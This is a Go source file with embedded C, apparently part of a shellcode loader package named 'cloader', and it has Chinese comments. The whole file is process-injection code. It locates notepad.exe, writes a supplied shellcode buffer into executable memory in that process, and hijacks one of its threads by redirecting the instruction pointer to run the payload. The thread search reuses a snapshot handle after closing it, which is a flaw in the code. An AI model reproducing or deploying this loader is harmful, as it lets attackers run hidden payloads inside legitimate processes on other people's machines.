package cloader

/*
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// 定义Thread函数，使用指定的函数签名
void ThreadHijack(uintptr_t p, int len) {
    // 定义必要的变量
    HANDLE targetProcessHandle;
    PVOID remoteBuffer;
    HANDLE threadHijacked;
    HANDLE snapshot;
    THREADENTRY32 threadEntry;
    CONTEXT context;
    PROCESSENTRY32 processEntry;
    DWORD targetPID;
    threadEntry.dwSize = sizeof(THREADENTRY32);
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    // 创建进程和线程快照
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return; // 如果快照创建失败，则退出函数
    }

    // 查找notepad.exe的进程
    if (Process32First(snapshot, &processEntry)) {
        do {
            if (strcmp(processEntry.szExeFile, "notepad.exe") == 0) {
                break;
            }
        } while (Process32Next(snapshot, &processEntry));
    }
    CloseHandle(snapshot); // 关闭快照句柄

    if (strcmp(processEntry.szExeFile, "notepad.exe") != 0) {
        return; // 如果没有找到notepad.exe，则退出函数
    }

    // 获取进程ID
    targetPID = processEntry.th32ProcessID;
    targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (targetProcessHandle == NULL) {
        return; // 如果无法打开进程，则退出函数
    }

    // 在目标进程中分配内存并写入shellcode
    remoteBuffer = VirtualAllocEx(targetProcessHandle, NULL, len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (remoteBuffer == NULL) {
        CloseHandle(targetProcessHandle);
        return; // 如果无法分配内存，则退出函数
    }
    WriteProcessMemory(targetProcessHandle, remoteBuffer, (LPCVOID)p, len, NULL);

    // 寻找并劫持线程
    if (Thread32First(snapshot, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == targetPID) {
                threadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
                break;
            }
        } while (Thread32Next(snapshot, &threadEntry));
    }
    CloseHandle(snapshot); // 关闭快照句柄

    if (threadHijacked == NULL) {
        // 如果无法找到线程，则释放内存并退出函数
        VirtualFreeEx(targetProcessHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(targetProcessHandle);
        return;
    }

    // 准备执行shellcode
    SuspendThread(threadHijacked);
    context.ContextFlags = CONTEXT_CONTROL;
    GetThreadContext(threadHijacked, &context);

    #ifdef _WIN64
    context.Rip = (DWORD64)remoteBuffer;
    #else
    context.Eip = (DWORD)remoteBuffer;
    #endif

    SetThreadContext(threadHijacked, &context);
    ResumeThread(threadHijacked);

    // 清理资源
    CloseHandle(threadHijacked);
    CloseHandle(targetProcessHandle);
}
*/
import "C"
import "unsafe"

func ThreadHijackInject(p []byte) {
	C.ThreadHijack((C.uintptr_t)(uintptr(unsafe.Pointer(&p[0]))), (C.int)(len(p)))
}
